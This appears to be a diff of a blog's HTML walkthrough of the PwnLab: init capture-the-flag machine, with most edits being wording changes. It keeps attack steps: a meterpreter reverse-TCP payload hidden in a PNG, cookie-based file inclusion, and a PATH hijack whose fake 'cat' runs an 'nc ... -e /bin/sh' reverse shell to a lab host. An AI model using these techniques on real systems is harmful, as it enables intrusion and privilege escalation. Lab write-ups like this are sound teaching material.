@@ -11,9 +11,6 @@
 <!-- Title -->
 <title>Gandosha - Autodidacticism.</title>
 
-<!-- Favicon 
-<link rel="icon" href="img/core-img/favicons.ico">-->
-
 <!-- Core Stylesheet -->
 <link rel="stylesheet" href="style.css">
 
@@ -242,8 +239,6 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Thu Oct  4 18:08:01 2018 -- 1 IP address (1 host up) scanned in 28.22 seconds
 </pre>
 <hr>
-</div>
-</div>
 <br>
 <br>
 <p><h3>Port 80 check:</h3></p>
@@ -252,7 +247,7 @@ OS and Service detection performed. Please report any incorrect results at https
 <img src="img/pwnlab_init/screenshots/1.png" alt="Attempt to access via http port 80" style="border:1px solid black;"> 
 <br>
 <br>
-<p><font size="3.5" color="black">I tried to spider and fuzz it in order to reveal some content:</font></p>
+<p><font size="3.5" color="black">I tried to spider and fuzz it in order to discover some content:</font></p>
 <img src="img/pwnlab_init/screenshots/2.png" alt="spider" style="border:1px solid black;">
 <br>
 <br>
@@ -319,31 +314,26 @@ PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBu
 </html>
 </pre>
 <br>
-<br>
 <p><font size="3.5" color="black">Those pages revealed some base64 string. So, I decoded those strings to see if there is something there:</font></p>
 <img src="img/pwnlab_init/screenshots/6.png" alt="config" style="border:1px solid black;">
 <br>
 <br>
 <p><font size="3.5" color="black">DB creds.</font></p>
 <br>
-<br>
 <img src="img/pwnlab_init/screenshots/8.png" alt="Login.php" style="border:1px solid black;">
 <br>
 <br>
 <p><font size="3.5" color="black">Login.php - not interesting.</font></p>
-<br>
 <br>
 <img src="img/pwnlab_init/screenshots/10.png" alt="uncommented cookie check and include" style="border:1px solid black;">
 <br>
 <br>
 <p><font size="3.5" color="black">index.php - uncommented cookie check and include.</font></p>
 <br>
-<br>
 <img src="img/pwnlab_init/screenshots/12.png" alt="upload directory and what file extension i can upload to this directory" style="border:1px solid black;">
 <br>
 <br>
-<p><font size="3.5" color="black">upload.php - upload directory and what file extension i can upload to this directory.</font></p>
-<br>
+<p><font size="3.5" color="black">upload.php - upload directory and what file extensions are in whitelist.</font></p>
 <br>
 <p><font size="3.5" color="black">Using this crucial information i was able to understand how does the application work.</font></p>
 <hr>
@@ -396,10 +386,10 @@ MySQL [Users]> quit
 Bye
 </pre>
 <br>
-<p><font size="3.5" color="black">User names and passwords in base64.</font></p>
+<p><font size="3.5" color="black">User names and passwords in base64 were found.</font></p>
 <br>
 <br>
-<p><font size="3.5" color="black">I decoded them and added to creds file:</font></p>
+<p><font size="3.5" color="black">I decoded those values and added them to my creds file:</font></p>
 <img src="img/pwnlab_init/screenshots/13.png" alt="decode base64 password" style="border:1px solid black;">
 <br>
 <br>
@@ -414,19 +404,20 @@ mike U0lmZHNURW42SQ== SIfdsTEn6I
 kane aVN2NVltMkdSbw== iSv5Ym2GRo
 root H4u%QJ_H99
 </pre>
+<hr>
 <br>
 <br>
 <p><h3>Login and upload a malicious png:</h3></p>
 <hr>
-<p><font size="3.5" color="black">Login using kent creds:</font></p>
+<p><font size="3.5" color="black">Login using kent's creds:</font></p>
 <img src="img/pwnlab_init/screenshots/14.png" alt="login page" style="border:1px solid black;">
 <br>
 <br>
-<p><font size="3.5" color="black">Redirected to the upload page:</font></p>
+<p><font size="3.5" color="black">After a successful login, i was redirected by the application to the upload page:</font></p>
 <img src="img/pwnlab_init/screenshots/15.png" alt="upload page" style="border:1px solid black;">
 <br>
 <br>
-<p><font size="3.5" color="black">Preperation of the malicious png:</font></p>
+<p><font size="3.5" color="black">I downloaded pwnlab.png from /images directory and used it as the malicious png:</font></p>
 <pre style="background-color:black;color:white;">
 [GandoPC 192.168.43.4]# wget http://192.168.43.4/images/pwnlab.png
 --2018-10-04 19:32:55--  http://192.168.43.4/images/pwnlab.png
@@ -445,7 +436,6 @@ pwnlab.png                                      100%[===========================
 No encoder or badchars specified, outputting raw payload
 Payload size: 30303 bytes
 </pre>
-<br>
 <br>
 <p><font size="3.5" color="black">Listener setup:</font></p>
 <pre style="background-color:black;color:white;">
@@ -480,8 +470,7 @@ PAYLOAD => php/meterpreter_reverse_tcp
 [*] Started reverse TCP handler on 192.168.43.3:4444  
 </pre>
 <br>
-<br>
-<p><font size="3.5" color="black">Upload:</font></p>
+<p><font size="3.5" color="black">Upload of the malicious png:</font></p>
 <img src="img/pwnlab_init/screenshots/17.png" alt="upload" style="border:1px solid black;">
 <br>
 <br>
@@ -489,15 +478,17 @@ PAYLOAD => php/meterpreter_reverse_tcp
 <br>
 <br>
 <img src="img/pwnlab_init/screenshots/19.png" alt="upload success2" style="border:1px solid black;">
-<p><font size="3.5" color="black">My .png file uploaded successfully.</font></p>
+<p><font size="3.5" color="black">My .png file was uploaded successfully.</font></p>
 <p><font size="3.5" color="black">I thought that opening up the uploaded .png should get me a reverse meterpreter shell. But, it did not work. Something there did not execute:</font></p>
 <img src="img/pwnlab_init/screenshots/20.png" alt="uploaded png" style="border:1px solid black;">
+<hr>
 <br>
 <br>
 <p><h3>Cookie manipulation and getting a reverse meterpreter shell:</h3></p>
 <hr>
-<p><font size="3.5" color="black">I added a "lang" cookie to a crafted http get request using kent's user valid PHPSESSID cookie:</font></p>
+<p><font size="3.5" color="black">I added a "lang" cookie to a crafted http get request using kent's valid PHPSESSID cookie:</font></p>
 <img src="img/pwnlab_init/screenshots/21.png" alt="cookie manipulation" style="border:1px solid black;">
+<br>
 <br>
 <p><font size="3.5" color="black">Immediately i got a shell:</font></p>
 <pre style="background-color:black;color:white;">
@@ -528,10 +519,12 @@ lo        Link encap:Local Loopback
           collisions:0 txqueuelen:0 
           RX bytes:9744 (9.5 KiB)  TX bytes:9744 (9.5 KiB)
 </pre>
+<hr>
 <br>
 <br>
 <p><h3>Privilege Escalation:</h3></p>
 <hr>
+<p><font size="3.5" color="black">I used linuxprivchecker.py in order to enumerate the target:</font></p>
 <pre style="background-color:black;color:white;">
 www-data@pwnlab:/var/www/html$ id    
 id
@@ -1850,7 +1843,7 @@ LINUX PRIVILEGE ESCALATION CHECKER
 Finished
 =================================================================================================
 </pre>
-<p><font size="3.5" color="black">Nothing using www-data user. I decided to use kane's user:</font></p>
+<p><font size="3.5" color="black">There's nothing using www-data user. I switched to kane's user and i did the same:</font></p>
 <pre style="background-color:black;color:white;">
 www-data@pwnlab:/var/www/html$ su kane
 su kane
@@ -3353,7 +3346,7 @@ __TMC_END__
 _ITM_registerTMCloneTable
 _init
 </pre>
-<p><font size="3.5" color="black">This file performs a cat command (cat /home/mike/msg.txt) using mike's privileges. I decided to manipulate $PATH in order to gain another shell:</font></p>
+<p><font size="3.5" color="black">This file performs a cat command (cat /home/mike/msg.txt) using mike's privileges. I decided to create a cat command and manipulate $PATH in order to gain another shell:</font></p>
 <pre style="background-color:black;color:white;">
 kane@pwnlab:~$ echo 'nc 192.168.43.3 4445 -e /bin/sh' > cat
 echo 'nc 192.168.43.3 4445 -e /bin/sh' > cat
@@ -3367,7 +3360,7 @@ chmod +x cat
 kane@pwnlab:~$ ./msgmike
 ./msgmike
 </pre>
-<p><font size="3.5" color="black">Shell with mike's privileges and attempt to escalate to root:</font></p>
+<p><font size="3.5" color="black">It worked. Next, I tried to escalate my privileges to root:</font></p>
 <pre style="background-color:black;color:white;">
 [gandosha@GandoPC 192.168.43.4]$ ncat -lvnp 4445
 Ncat: Version 7.70 ( https://nmap.org/ncat )
@@ -4888,7 +4881,7 @@ _ITM_registerTMCloneTable
 _init
 </pre>
 <p><font size="3.5" color="black">Using strings, i discovered that this file is sending a string to root (/bin/echo %s >> /root/messages.txt).</font></p>
-<p><font size="3.5" color="black">I found a command execution using root permissions. Next, I tried to get a root shell:</font></p>
+<p><font size="3.5" color="black">I found a command execution using root permissions:</font></p>
 <pre style="background-color:black;color:white;">
 mike@pwnlab:/home/mike$ ./msg2root
 ./msg2root
